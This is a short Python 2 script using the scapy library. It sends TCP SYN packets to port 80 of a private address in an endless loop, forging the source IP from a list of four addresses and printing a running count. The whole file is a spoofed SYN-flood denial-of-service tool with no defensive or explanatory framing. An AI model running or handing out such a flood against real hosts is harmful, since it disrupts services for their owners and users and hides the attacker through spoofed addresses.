import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import time
from scapy.all import *

seq = 54545
sport = 49153
dport = 80
destination_ip = '192.168.0.103'

ip_list = ['115.12.4.151','15.12.4.152','15.12.4.153','15.12.4.154']
packet_sent_count = 0
while (True):
	for random_ip in ip_list:
		ip = IP(src=random_ip,dst=destination_ip)
		syn = TCP(sport=sport, dport=dport, flags='S', seq=seq)
		packet = ip/syn
		send(packet,iface="wlan0")
		packet_sent_count = packet_sent_count + 1
		if(packet_sent_count % 100 == 0):
			print "Syn packet sent " + str(packet_sent_count)